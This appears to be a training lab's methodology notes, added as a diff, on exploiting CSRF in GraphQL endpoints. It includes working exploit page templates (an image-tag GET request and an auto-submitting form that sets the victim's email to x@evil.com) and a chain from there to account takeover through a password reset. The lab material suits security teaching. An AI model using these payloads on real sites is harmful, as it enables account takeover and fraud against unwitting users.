@@ -1,0 +1,35 @@
+LAB 5 — Methodology
+====================
+
+STEP 1 — IDENTIFY CSRF CONDITIONS
+  • Does the endpoint accept GET with query param? → automatic CSRF.
+  • Does the endpoint accept application/x-www-form-urlencoded? → CSRF.
+  • Does the session cookie have SameSite=None or missing SameSite? → CSRF.
+  • Is there a CSRF token in the request? → if missing → CSRF.
+
+STEP 2 — IDENTIFY VALUABLE MUTATIONS
+  • changeEmail / changePassword → account takeover.
+  • deleteAccount / disableUser → destructive.
+  • addAdmin / elevateRole → privilege escalation.
+  • transferFunds / placeOrder → financial impact.
+
+STEP 3 — BUILD EXPLOIT PAGE
+  a) GET-based: <img src="https://victim/graphql?query=mutation{...}">
+  b) Form-based:
+     <form method="POST" action="https://victim/graphql"
+           enctype="application/x-www-form-urlencoded">
+       <input name="query" value="mutation{changeEmail(email:'x@evil.com'){email}}">
+     </form>
+     <script>document.forms[0].submit()</script>
+
+STEP 4 — TEST
+  • Host exploit page on a different origin.
+  • Log in to victim app in same browser.
+  • Visit exploit page → mutation should execute cross-origin.
+
+STEP 5 — CHAIN FOR TAKEOVER
+  • CSRF to changeEmail → trigger password reset → receive reset link → log in.
+
+TOOLS
+  • Burp Suite (CSRF PoC Generator — right-click request → Engagement tools)
+  • OWASP CSRFTester
